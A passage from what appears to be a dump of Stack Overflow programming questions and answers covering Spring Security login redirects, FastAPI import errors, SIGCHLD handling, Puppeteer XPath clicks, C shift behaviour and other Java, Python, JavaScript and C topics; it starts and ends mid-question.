        System.out.println(""Password: "" + springUser.getPassword());
        System.out.println(""Authorities: "" + springUser.getAuthorities());
        return springUser;

    }
}

logs:-
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.1.0)

2024-10-26T20:07:44.105+05:30  INFO 19060 --- [  restartedMain] com.example.webapp.Dia1Application       : Starting Dia1Application using Java 17.0.3 with PID 19060 (C:\Users\Admin\eclipse-workspace\dia-1\target\classes started by Admin in workspace\dia-1)
2024-10-26T20:07:44.162+05:30  INFO 19060 --- [  restartedMain] com.example.webapp.Dia1Application       : No active profile set, falling back to 1 default profile: ""default""
2024-10-26T20:07:44.458+05:30  INFO 19060 --- [  restartedMain] o.s.b.devtools.restart.ChangeableUrls    : The Class-Path manifest attribute in C:\Users\Admin\.m2\repository\com\oracle\database\jdbc\ojdbc8\19.8.0.0\ojdbc8-19.8.0.0.jar referenced one or more files that do not exist: file:/C:/Userscom/oracle/database/jdbc/ojdbc8/19.8.0.0/oraclepki.jar
2024-10-26T20:07:44.459+05:30  INFO 19060 --- [  restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : Devtools property defaults active! Set 'spring.devtools.add-properties' to 'false' to disable
2024-10-26T20:07:44.460+05:30  INFO 19060 --- [  restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : For additional web related logging consider setting the 'logging.level.web' property to 'DEBUG'
2024-10-26T20:07:47.352+05:30  INFO 19060 --- [  restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
2024-10-26T20:07:47.948+05:30  INFO 19060 --- [  restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 367 ms. Found 3 JPA repository interfaces.
2024-10-26T20:07:51.595+05:30  INFO 19060 --- [  restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
2024-10-26T20:07:51.642+05:30  INFO 19060 --- [  restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
2024-10-26T20:07:51.643+05:30  INFO 19060 --- [  restartedMain] o.apache.catalina.core.StandardEngine    : Starting Servlet engine: [Apache Tomcat/10.1.8]
2024-10-26T20:07:51.957+05:30  INFO 19060 --- [  restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
2024-10-26T20:07:51.959+05:30  INFO 19060 --- [  restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 7497 ms
2024-10-26T20:07:52.995+05:30  INFO 19060 --- [  restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
2024-10-26T20:07:53.414+05:30  INFO 19060 --- [  restartedMain] org.hibernate.Version                    : HHH000412: Hibernate ORM core version 6.2.2.Final
2024-10-26T20:07:53.428+05:30  INFO 19060 --- [  restartedMain] org.hibernate.cfg.Environment            : HHH000406: Using bytecode reflection optimizer
2024-10-26T20:07:54.294+05:30  INFO 19060 --- [  restartedMain] o.h.b.i.BytecodeProviderInitiator        : HHH000021: Bytecode provider name : bytebuddy
2024-10-26T20:07:55.194+05:30  INFO 19060 --- [  restartedMain] o.s.o.j.p.SpringPersistenceUnitInfo      : No LoadTimeWeaver setup: ignoring JPA class transformer
2024-10-26T20:07:55.295+05:30  INFO 19060 --- [  restartedMain] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
2024-10-26T20:07:56.818+05:30  INFO 19060 --- [  restartedMain] com.zaxxer.hikari.pool.HikariPool        : HikariPool-1 - Added connection oracle.jdbc.driver.T4CConnection@567f88b3
2024-10-26T20:07:56.826+05:30  INFO 19060 --- [  restartedMain] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
2024-10-26T20:07:58.454+05:30  INFO 19060 --- [  restartedMain] org.hibernate.orm.dialect                : HHH035001: Using dialect: org.hibernate.dialect.OracleDialect, version: 21.0
2024-10-26T20:07:59.957+05:30  INFO 19060 --- [  restartedMain] o.h.b.i.BytecodeProviderInitiator        : HHH000021: Bytecode provider name : bytebuddy
2024-10-26T20:08:04.301+05:30  INFO 19060 --- [  restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2024-10-26T20:08:04.329+05:30  INFO 19060 --- [  restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
CustomUserDetailsService has been initialized.
inside password encoder
2024-10-26T20:08:06.758+05:30  WARN 19060 --- [  restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
inside authentication provider
inside securityFilterChain
2024-10-26T20:08:07.257+05:30  INFO 19060 --- [  restartedMain] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
2024-10-26T20:08:08.083+05:30  INFO 19060 --- [  restartedMain] o.s.s.web.DefaultSecurityFilterChain     : Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@7beeb809, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@1250ad26, org.springframework.security.web.context.SecurityContextHolderFilter@f1c53e8, org.springframework.security.web.header.HeaderWriterFilter@5e21c003, org.springframework.security.web.authentication.logout.LogoutFilter@6af304cf, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@47bc56f1, org.springframework.security.web.session.ConcurrentSessionFilter@576c970f, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@2ad56bcf, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@5378e4fd, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@377e7a43, org.springframework.security.web.session.SessionManagementFilter@1454bc00, org.springframework.security.web.access.ExceptionTranslationFilter@7b40484, org.springframework.security.web.access.intercept.AuthorizationFilter@107f250f]
inside authentication manager
2024-10-26T20:08:09.118+05:30  INFO 19060 --- [  restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
2024-10-26T20:08:09.257+05:30  INFO 19060 --- [  restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path ''
2024-10-26T20:08:09.300+05:30  INFO 19060 --- [  restartedMain] com.example.webapp.Dia1Application       : Started Dia1Application in 27.13 seconds (process running for 30.667)
Hibernate: select r1_0.role_id,r1_0.role_name from roles r1_0 where r1_0.role_name=?
Hibernate: select u1_0.user_id,u1_0.password,u1_0.user_name from users u1_0 where u1_0.user_name=?
Hibernate: select r1_0.user_id,r1_1.role_id,r1_1.role_name from user_roles r1_0 join roles r1_1 on r1_1.role_id=r1_0.role_id where r1_0.user_id=?
2024-10-26T20:08:29.660+05:30  INFO 19060 --- [nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
2024-10-26T20:08:29.661+05:30  INFO 19060 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
2024-10-26T20:08:29.671+05:30  INFO 19060 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 7 ms
2024-10-26T20:08:29.708+05:30 DEBUG 19060 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Securing POST /home
2024-10-26T20:08:29.747+05:30 DEBUG 19060 --- [nio-8080-exec-1] o.s.s.w.a.AnonymousAuthenticationFilter  : Set SecurityContextHolder to anonymous SecurityContext
2024-10-26T20:08:29.887+05:30 DEBUG 19060 --- [nio-8080-exec-1] o.s.s.w.s.HttpSessionRequestCache        : Saved request http://localhost:8080/home?continue to session
2024-10-26T20:08:29.892+05:30 DEBUG 19060 --- [nio-8080-exec-1] o.s.s.web.DefaultRedirectStrategy        : Redirecting to http://localhost:8080/login
2024-10-26T20:08:29.974+05:30 DEBUG 19060 --- [nio-8080-exec-2] o.s.security.web.FilterChainProxy        : Securing GET /login
2024-10-26T20:08:29.975+05:30 DEBUG 19060 --- [nio-8080-exec-2] o.s.s.w.a.AnonymousAuthenticationFilter  : Set SecurityContextHolder to anonymous SecurityContext
2024-10-26T20:08:29.981+05:30 DEBUG 19060 --- [nio-8080-exec-2] o.s.security.web.FilterChainProxy        : Secured GET /login
2024-10-26T20:08:31.829+05:30 DEBUG 19060 --- [nio-8080-exec-3] o.s.security.web.FilterChainProxy        : Securing GET /style.css
2024-10-26T20:08:31.829+05:30 DEBUG 19060 --- [nio-8080-exec-3] o.s.s.w.a.AnonymousAuthenticationFilter  : Set SecurityContextHolder to anonymous SecurityContext
2024-10-26T20:08:31.866+05:30 DEBUG 19060 --- [nio-8080-exec-3] o.s.security.web.FilterChainProxy        : Secured GET /style.css

roles table details:-
ROLE_ID   ROLE_NAME
1         ROLE_ADMIN

so, i have added the logs as well inside loaduserbyusername, but those logs are not generating during app startup or on successful login. could anyone help like what's going wrong.
","You have an error on the login page in the line <form action=""/home"" method=""POST"">. You send authentication data to an endpoint /home that not only can't accept it, but is also protected from anonymous access, so Spring Security redirects you to the login page over and over again.
You need to send a username and password to the /login.
<form action=""/login"" method=""POST"">
...
</form>

",java
dataframe  select the minimum set of rows to cover all possible values of each columns,"I'm working on a use-case on which I need to retrieve a minimal sample of rows from a dataframe that contains at least one row for each unique value found in all columns.
A simplified example could be :



ID
A
B
C




1
D
G
X


2
D
G
Y


3
E
G
Y


4
E
H
Y


5
F
I
Z



Here I would like to keep rows with ID 1, 4 and 5, in order to have at least one row with values D, E and F from A; G, H and I from B and X, Y and Z from C. I don't need to have all combinations, only all uniques values from every column:



ID
A
B
C




1
D
G
X


4
E
H
Y


5
F
I
Z



What could be an efficient way to do this?
Thank you
","Here is what I ended up going with:

Count the number of occurrences of every value in each column, and order those by count asc
Select a random row that contains the least occurring value of all, and add this value and all the others from the selected row into a dictionary
Looping through my ordered list of values, count the number of ""new values"" for each row that contains the current value of the list the loop is on. Pick the row with the highest number of ""new values"".
Repeat until all values have been picked

Far from the optimal solution as I'm only minimizing the number of rows on each step, but it's pretty efficient and it gets the job done.
Could have probably gone with a recursive algorithm to test all solutions but I don't have a big requirement on the final set of rows, except it needed all possible values.
Thank you all for inputs, they helped me come up to this solution.
",python
inject css stylesheet as string using javascript,"I'm developing a Chrome extension, and I'd like users to be able to add their own CSS styles to change the appearance of the extension's pages (not web pages). I've looked into using document.stylesheets, but it seems like it wants the rules to be split up, and won't let you inject a complete stylesheet. Is there a solution that would let me use a string to create a new stylesheet on a page?
I'm currently not using jQuery or similar, so pure Javascript solutions would be preferable.
","There are a couple of ways this could be done, but the simplest approach is to create a <style> element, set its textContent property, and append to the page’s <head>.
/**
 * Utility function to add CSS in multiple passes.
 * @param {string} styleString
 */
function addStyle(styleString) {
  const style = document.createElement('style');
  style.textContent = styleString;
  document.head.append(style);
}

addStyle(`
  body {
    color: red;
  }
`);

addStyle(`
  body {
    background: silver;
  }
`);

If you want, you could change this slightly so the CSS is replaced when addStyle() is called instead of appending it.
/**
 * Utility function to add replaceable CSS.
 * @param {string} styleString
 */
const addStyle = (() => {
  const style = document.createElement('style');
  document.head.append(style);
  return (styleString) => style.textContent = styleString;
})();

addStyle(`
  body {
    color: red;
  }
`);

addStyle(`
  body {
    background: silver;
  }
`);

IE edit: Be aware that IE9 and below only allows up to 32 stylesheets, so watch out when using the first snippet. The number was increased to 4095 in IE10.
2020 edit: This question is very old but I still get occasional notifications about it so I’ve updated the code to be slightly more modern and replaced .innerHTML with .textContent. This particular instance is safe, but avoiding innerHTML where possible is a good practice since it can be an XSS attack vector.
",javascript
compile single java file with two classes into two class files,"I currently have a .java file set up like this:
package com.ds;

class c{...}

public class Main{...}

When I compile the file Main.java, it results in a single .class file being Main.class.
When I try to run the .class with java com.ds.Main it does not work! It says it cannot find or load the class.
When I try to run the .class with java Main it runs, but I get an error like so:
Exception in thread ""main"" java.lang.NoClassDefFoundError: Main (wrong name: com
/DatingService/Main)


at java.lang.ClassLoader.defineClass1(Native Method)

at java.lang.ClassLoader.defineClass(ClassLoader.java:792)
at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
at java.net.URLClassLoader.defineClass(URLClassLoader.java:449)
at java.net.URLClassLoader.access$100(URLClassLoader.java:71)
at java.net.URLClassLoader$1.run(URLClassLoader.java:361)
at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
at java.lang.ClassLoader.loadClass(ClassLoader.java:424)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
at sun.launcher.LauncherHelper.checkAndLoadMain(LauncherHelper.java:482)

I've seen this before while trying to find a solution and none of the solutions I found  applied to me or just didn't work.
After doing a bit more research I am assuming that javac will not split the classes within a file by at least default? I know that many IDEs like Eclipse and IntelliJ split the classes into two separate .class files (I can confirm this). So is there any way for javac to do this? I'm using javac as my compiler for IntelliJ so there must be a way unless it's done before compiling.
If I remove the package, I can run java Main perfectly fine with only a single .class file compiled. So I'm a bit confused, and a little desperate. I am trying to completely avoid changing my code or splitting the classes into two separate .java files.
","I am not sure what you are doing wrong so I will just show you how it can be done.
Lets say you have directories and files
[myProject]
  |
  +--[src]
  |    |
  |    +--[com]
  |        |
  |        +--[DatingService]
  |            |
  |            +-- Main.java
  |
  +--[classes]

and your Main.java file looks something like
package com.DatingService;

class c{
    private int i;
    public void setI(int i){
        this.i=i;
    }
    public int getI(){
        return this.i;
    }
}

public class Main{
    public static void main(String[] args){
        c myCVariable = new c();

        myCVariable.setI(10);
        System.out.println(myCVariable.getI());
    }
}

In terminal you need to go to myProject directory and from it use
myProject>javac -d classes src\com\DatingService\Main.java
Thanks to -d (directory) parameter packages with all compiled classes should be placed in classes directory (note that classes directory must already exist). So c.class and Main.class will be placed in myProject\classes\com\DatingService.
Now to run main method from Main class you just need to provide information about directory that contains your packages (this is ClassPath) and also use full.package.name.to.your.MainClass. So you will have to add -classpath classes (or shorter -cp classes) parameter to your java command and run it like
myProject>java -cp classes com.DatingService.Main
(note: there is no .java suffix after Main class since JVM is running binaries stored in .class files, not code from .java files)
",java
how do i get rid of this errortraceback most recent call last file quotltstringgtquot line 1 in ltmodulegt file quotcprogram,"I keep trying to start my python backend with  uvicorn main:app --reload but I keep getting this error:
INFO:     Will watch for changes in these directories: ['C:\\Users\\darkg\\OneDrive\\Desktop\\loginpage\\FastAP_BackEnd\\books']
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
INFO:     Started reloader process [532] using StatReload
Traceback (most recent call last):
  File ""<string>"", line 1, in <module>
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\multiprocessing\spawn.py"", line 116, in spawn_main
    exitcode = _main(fd, parent_sentinel)
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\multiprocessing\spawn.py"", line 126, in _main
    self = reduction.pickle.load(from_parent)
  File ""C:\Users\darkg\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\site-packages\uvicorn\__init__.py"", line 1, in <module>
    from uvicorn.config import Config
  File ""C:\Users\darkg\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\site-packages\uvicorn\config.py"", line 1, in <module>
    import asyncio
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\asyncio\__init__.py"", line 8, in <module>
    from .base_events import *
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\asyncio\base_events.py"", line 18, in <module>
    import concurrent.futures
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\concurrent\futures\__init__.py"", line 8, in <module>
    from concurrent.futures._base import (FIRST_COMPLETED,
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\concurrent\futures\_base.py"", line 7, in <module>
    import logging
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\logging\__init__.py"", line 26, in <module>
    import sys, os, time, io, re, traceback, warnings, weakref, collections.abc
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\traceback.py"", line 5, in <module>
    import linecache
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\linecache.py"", line 11, in <module>
    import tokenize
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\tokenize.py"", line 35, in <module>
    from token import *
  File ""C:\Users\darkg\OneDrive\Desktop\loginpage\FastAP_BackEnd\books\.\token.py"", line 5, in <module>
    from . import schemas
ImportError: attempted relative import with no known parent package


I tried starting it with   python -m uvicorn main:app --reload
but I get this error  instead

Traceback (most recent call last):
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\runpy.py"", line 187, in _run_module_as_main
    mod_name, mod_spec, code = _get_module_details(mod_name, _Error)
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\runpy.py"", line 146, in _get_module_details
    return _get_module_details(pkg_main_name, error)
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\runpy.py"", line 110, in _get_module_details
    __import__(pkg_name)
  File ""C:\Users\darkg\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\site-packages\uvicorn\__init__.py"", line 1, in <module>
    from uvicorn.config import Config
  File ""C:\Users\darkg\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\site-packages\uvicorn\config.py"", line 1, in <module>
    import asyncio
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\asyncio\__init__.py"", line 8, in <module>
    from .base_events import *
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\asyncio\base_events.py"", line 18, in <module>
    import concurrent.futures
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\concurrent\futures\__init__.py"", line 8, in <module>
    from concurrent.futures._base import (FIRST_COMPLETED,
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\concurrent\futures\_base.py"", line 7, in <module>
    import logging
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\logging\__init__.py"", line 26, in <module>
    import sys, os, time, io, re, traceback, warnings, weakref, collections.abc
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\traceback.py"", line 5, in <module>
    import linecache
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\linecache.py"", line 11, in <module>
    import tokenize
  File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.1776.0_x64__qbz5n2kfra8p0\lib\tokenize.py"", line 35, in <module>
    from token import *
  File ""C:\Users\darkg\OneDrive\Desktop\loginpage\FastAP_BackEnd\books\token.py"", line 5, in <module>
    from . import schemas
ImportError: attempted relative import with no known parent package

Here is the main code
from . import models
from fastapi import FastAPI

from .database import engine
from .routers import books, users,authentication

app=FastAPI()
models.Base.metadata.create_all(engine)

app.include_router(books.router)
app.include_router(users.router)
app.include_router(authentication.router)




Here is my Code File Path If that helps solve the issue :
Code File Structure
I have tried everything but cant seem to find a way to fix this . I've redowloaded python. I've reinstalled every package, ive added paths to my packages, but nothing seems to work. Any help would be greatly appreciated. I am completely lost
","Python doesn't know that the directory containing your modules (including main.py) is a package, therefore it can't properly locate imports. Create an empty __init__.py file in this directory to mark it as a regular package.
A rule of thumb is to mark all your directories that contain python modules as packages with this method.
There's another type of Python packages that may make your code sometimes work: namespace packages. They don't have to contain an __init__.py file. I recommend to just avoid them, unless you understand exactly what they're for and why you need them. [Doc reference]
For a quick reference, search through the FastAPI documentation for ""project file structure"" (it may be called something similar).
",python
dialog element 39open39 event,"For the dialog element <dialog>, is there some sort of ""open"" event that is fired when it is shown, either normally or as a modal?
The spec isn't totally clear on this, and MDN just lists a bunch of inherited events.
The close event does fire, but I can't seem to get any sort of open event.
Example HTML:
<dialog>
  <h1>Oh hey, a dialog...</h1>
</dialog>

And in JavaScript:
document.querySelector('dialog').addEventListener('open', (e) => {
  console.log(e);
});
document.querySelector('dialog').showModal();

","2025 Update: beforetoggle and toggle events
This is now available via the beforetoggle and toggle events in Chromium v123:  https://github.com/whatwg/html/pull/10091
Previous Answer:
No, there is no open event.
The dialog has an open property which can determine if it's opened or not, but unfortunately there's no event when this transitions.
",javascript
catching a signal only in a specific occasion in c,"I know that I can handle SIGCHLD as I want whenever it is sent. If I am not wrong, SIGCHLD is sent to the parent process every time the child is stopped, not only through termination but also because of an interrupt (eg SIGSTOP) sent.  I want SIGCHLD to be handled specifically only on termination, not on interruption.
The only thing I tried is to have the child to send SIGUSR1 to the parent at termination (its last command is kill(getppid(), SIGUSR1);, so I handle this signal instead. Of course it works as I want, but I am wondering: can I track termination without sending any additional signal only by SIGCHLD?
","SA_NOCLDSTOP will prevent the generation of a SIGCHLD on child stop, as pointed out in another answer, and likely meets your needs.
For completeness, you could also inspect the si_code member of the siginfo_t struct passed to your three-argument signal handler or sigwaitinfo:
#define _POSIX_C_SOURCE 202405L
#include <signal.h>

....

void my_chld_handler(int signo, siginfo_t *info, void *context) {
  switch (info->si_code) {
  case CLD_EXITED:
  case CLD_KILLED: 
  case CLD_DUMPED:
    break;
  default: /* ignore TRAPPED STOPPED CONTINUED */
    return;
  }
  ... handle child termination ...
}

....
sa.sa_flags = SA_SIGINFO;
sa.sa_sigaction = my_chld_handler;
sigaction(SIGCHLD, &sa, NULL);
....

",c
do i need to compile the header files in a c program,"Sometimes I see someone compile a C program like this:
gcc -o hello hello.c hello.h
As I know, we just need to put the header files into the C program like:
#include ""somefile""
and compile the C program: gcc -o hello hello.c.
When do we need to compile the header files or why?
","Firstly, in general:
If these .h files are indeed typical C-style header files (as opposed to being something completely different that just happens to be named with .h extension), then no, there's no reason to ""compile"" these header files independently. Header files are intended to be included into implementation files, not fed to the compiler as independent translation units.
Since a typical header file usually contains only declarations that can be safely repeated in each translation unit, it is perfectly expected that ""compiling"" a header file will have no harmful consequences. But at the same time it will not achieve anything useful.
Basically, compiling hello.h as a standalone translation unit equivalent to creating a degenerate dummy.c file consisting only of #include ""hello.h"" directive, and feeding that dummy.c file to the compiler. It will compile, but it will serve no meaningful purpose.

Secondly, specifically for GCC:
Many compilers will treat files differently depending on the file name extension. GCC has special treatment for files with .h extension when they are supplied to the compiler as command-line arguments. Instead of treating it as a regular translation unit, GCC creates a precompiled header file for that .h file.
You can read about it here: http://gcc.gnu.org/onlinedocs/gcc/Precompiled-Headers.html
So, this is the reason you might see .h files being fed directly to GCC.
",c
sqlite39s fetchall returns none instead of an empty list,"According to the sqlite3 docs, fetchall() returns a list (empty if no rows meet the search criteria).  On occasion, not repeatable, I am getting a return value None.  What could None indicate, failed access to the DB?  a missing table?
","From a brief look at the source, it does not seem possible, barring memory corruption, for sqlite3's cursor's fetchall to return None. You must be doing something else that results in None.
",python
jacoco configuration for multi module is not working,"There is something strange going on with my jacoco configuration and I am not able to figure it out. I have visited multiple threads on stack overflow and other platforms and tried many thing, but didn't resolve this issue.
I have setup the java code coverage for multiple modules. This is my project structure

ABC

module1


DEF

module1
module2
module3

pom.xml


I have configured the jacoco for my DEF maven project. I am only configuring my DEF project. And this is what pom.xml contains
    <plugin>
        <groupId>org.jacoco</groupId>
        <artifactId>jacoco-maven-plugin</artifactId>
        <version>0.8.8</version>
        <executions>
            <execution>
                <goals>
                    <goal>prepare-agent</goal>
                </goals>
            </execution>
            <execution>
                <id>report</id>
                <phase>prepare-package</phase>
                <goals>
                    <goal>report-aggregate</goal>
                </goals>
                <configuration>
                 <outputDirectory>${project.basedir}/target/reports</outputDirectory>
                </configuration>
                </execution>
        </executions>
    </plugin>

Issue: The issue here is, it's generating the code coverage report in each module1, module2 and module3. But the report generated in module1, doesn't contains the code coverage for itself. Meaning, it shows the code coverage for module2 and module3, but it doesn't include module1 report in itself. I don't know what's wrong ?
EDIT : modules in DEF are maven modules and it didn't contains anything related to jacoco.
Any idea or any suggestions ?
Thanks
","Create one more module as ReportAggregator and move jacoco configuration from parent pom to ReportAggregator pom
",java
how do you click on an element with text in puppeteer,"Is there any method or solution to click on an element with text? I couldn't find one in the API.
For example I have the following HTML:
<div class=""elements"">
    <button>Button text</button>
    <a href=#>Href text</a>
    <div>Div text</div>
</div>

And I want to click on an element in which text is wrapped (click on the button inside .elements), like so:
Page.click('Button text', '.elements')

","Short answer
This XPath expression will query a button which contains the text ""Button text"":
const [button] = await page.$x(""//button[contains(., 'Button text')]"");
if (button) {
    await button.click();
}

To also respect the <div class=""elements""> surrounding the buttons, use the following code:
const [button] = await page.$x(""//div[@class='elements']/button[contains(., 'Button text')]"");

Explanation
To explain why using the text node (text()) is wrong in some cases, let's look at an example:
<div>
    <button>Start End</button>
    <button>Start <em>Middle</em> End</button>
</div>

First, let's check the results when using contains(text(), 'Text'):

//button[contains(text(), 'Start')] will return both two nodes (as expected)
//button[contains(text(), 'End')] will only return one nodes (the first) as text() returns a list with two texts (Start  and  End), but contains will only check the first one
//button[contains(text(), 'Middle')]  will return no results as text() does not include the text of child nodes

Here are the XPath expressions for contains(., 'Text'), which works on the element itself including its child nodes:

//button[contains(., 'Start')] will return both two buttons
//button[contains(., 'End')] will again return both two buttons
//button[contains(., 'Middle')]  will return one (the last button)

So in most cases, it makes more sense to use the . instead of text() in an XPath expression.
",javascript
how to translate a gtk app,"I want to translate my GTK+ application written in C++. I don not have any ideas where to start, I heard about gettext(), but I don't know, how should I use it.
","Take a look at archive of https://developer.gnome.org/gtk3/stable/gtk-question-index.html page, in 1.7. paragraph they explain how you can translate your applications using GNU gettext.
",c
right shift not working correctly for large longs,"when shifting bytes, there are some scenarios that do not seem to make sense, for example
printf(""shifted bytes %llx\n"",(((long long)1 << 63 ))>>1);

outputs c000000000000000, this does not happen with unsigned long longs or if the initial shift to the left is less than 63. However, since 1 is stored as 0000000000000001 in both signed and unsigned long longs and only bitwise operation are performed, there doesnt seem like there is any reason for the difference,how can something like this happen?
","You're shifting a signed value into the sign bit.  More formally, the result of the shift is outside the range of values a long long can store.
In this particular case, the mathematical result of 1<<63 is 263, and a long long (assuming 64 bit) has a range of  -263 to 263-1, so the result is out of range.  This triggers undefined behavior in your code.
This is described in section 6.5.8p2 of the C standard regarding the left shift operator:

The result of E1 << E2 is E1 left-shifted E2 bit positions; vacated
bits are filled with zeros. If E1 has an unsigned type, the value of
the result is E1 × 2E2, reduced modulo one more than the maximum value
representable in the result type. If E1 has a signed type and
nonnegative value, and E1 × 2E2 is representable in the result type,
then that is the resulting value; otherwise, the behavior is
undefined.

",c
what39s the reason of gcc warnings for converting an string constant to 39tchar 39,"I'm recently starting programing C Windows API from Charles Petzold, and somewhere we must write a header contain a lot of similar lines like below:
SM_CXSCREEN,            TEXT (""SM_CXSCREEN""), 
                            TEXT (""Screen width in pixels""),

and after use this header in a program, the GCC warning me like this:

ISO C++ forbids converting a string constant to 'TCHAR*' {aka 'char*'} [-Wwrite-strings]gcc

I hope to understand more about this specific warning.
","The error ""ISO C++ forbids converting a string constant to TCHAR* {aka char*}"" occurs because in C++, string literals like ""example"" are of type const char[] (or const wchar_t[] for wide-character literals like L""example""). However, you are trying to assign or pass them to a non-const pointer type like TCHAR* (or char*).
This is dangerous because modifying a string literal is undefined behaviour -  thus warning
",c
vitepwaplugin how to add webpush notifications,"I had the sw.js which receive webpush notifications.
But recently I intalled vite-PWA-plugin and now i can't add notifications by default config.
How can i configure this vite.config.ts to add to generated serviceWorker.js webpush implementation?
vite.config.ts:


import {defineConfig} from 'vite';
import laravel from 'laravel-vite-plugin';
import react from '@vitejs/plugin-react';

import path from 'path';
import {VitePWA} from ""vite-plugin-pwa"";

const manifest = {
    ""theme_color""     : ""#2B2B2B"",
    ""background_color"": ""#2B2B2B"",
    ""display""         : ""standalone"",
    ""scope""           : ""/"",
    ""start_url""       : ""/farm"",
    ""name""            : ""ColorBit"",
    ""short_name""      : ""Mining"",
    ""description""     : ""..."",
    ""icons""           : [
        {
